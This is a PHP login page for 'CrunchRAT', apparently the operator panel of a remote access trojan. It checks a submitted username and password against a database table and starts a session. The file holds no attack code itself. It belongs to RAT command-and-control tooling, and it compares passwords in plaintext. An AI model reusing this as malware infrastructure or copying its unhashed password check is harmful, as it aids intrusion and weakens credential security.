<?php  
    # Necessary at the top of every page for session management
    session_start();
  
    # Includes the RAT configuration file
    include "config/config.php";

    # Establishes a connection to the RAT database
    # Uses variables from "config/config.php"
    # "SET NAMES utf8" is necessary to be Unicode-friendly
    $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
?>

<!doctype html>
<html lang="en">
    <head> <!-- Start of header -->
        <meta charset="utf-8">
        <title>CrunchRAT</title>
        <!-- CDN links -->
        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://cdn.datatables.net/1.10.12/css/dataTables.bootstrap.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
        <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
        <script src="https://cdn.datatables.net/1.10.12/js/dataTables.bootstrap.min.js"></script>
        <script src="https://code.jquery.com/jquery-1.12.3.js"></script>
        <script src="https://cdn.datatables.net/1.10.12/js/jquery.dataTables.min.js"></script>
        <script src="https://cdn.datatables.net/1.10.12/js/dataTables.bootstrap.min.js"></script>
    </head> <!-- End of header -->

    <body> <!-- Start of body -->
        <nav class="navbar navbar-default"> <!-- Start of navigation bar -->
            <a class="navbar-brand" href="#">CrunchRAT</a>
        </nav> <!-- End of navigation bar -->

        <div class="container"> <!-- Start of main body container -->
            <form class="form-inline" method="post">
                <div class="form-group">
                    <input type="text" class="form-control" name="username" placeholder="Username">
                </div>
                <div class="form-group">
                    <input type="password" class="form-control" name="password" placeholder="Password">
                </div>
                <button id="test" type="submit" name="submit" class="btn btn-default">Login</button>
            </form>

            <?php
                # If the user clicked "Login"
                if (isset($_POST["submit"]))
                {
                    $username = $_POST["username"]; # Username
                    $password = $_POST["password"]; # Password
        
                    # If all of the necessary fields are set
                    if (isset($username) && !empty($username) && isset($password) && !empty($password))
                    {
                        # Determines if the username/password entered match a valid set of credentials
                        $statement = $dbConnection->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
                        $statement->bindValue(":username", $username);
                        $statement->bindValue(":password", $password);
                        $statement->execute();

                        # Gets row count
                        $rowCount = $statement->rowCount();

                        # Kills database connection
                        $statement->connection = null;

                        # "rowCount" will be "1" if successful authentication
                        if ($rowCount == 1)
                        {
                            # Successful authentication occurred
                            # We now start a session
                            $_SESSION["authenticated"] = 1;

                            # Sets $_SESSION["username"] to the current logged in user
                            # http://stackoverflow.com/questions/8703507/how-can-i-get-a-session-id-or-username-in-php
                            $_SESSION["username"] = $username;

                            # Redirects to index.php due to successful authentication
                            header("Location: index.php");
                        }
                        # Else authentication failure
                        else
                        {
                            # Displays error message - "Invalid username or password"
                            echo "<br><div class='alert alert-danger'>Invalid username or password</div>";
                        }
                    }
                    # Not all fields were set
                    else
                    {
                        # Displays error message - "Please fill out all fields."
                        echo "<br><div class='alert alert-danger'>Please fill out all fields</div>";
                    }
                }
            ?>

            <!-- Code obtained from: http://stackoverflow.com/questions/23101966/bootstrap-alert-auto-close -->
            <script>
                $(".alert").delay(1000).slideUp(200, function() {
                    $(this).alert('close');
                });
            </script>
        </div> <!-- End of main body container -->
  </body> <!-- End of body -->
</html>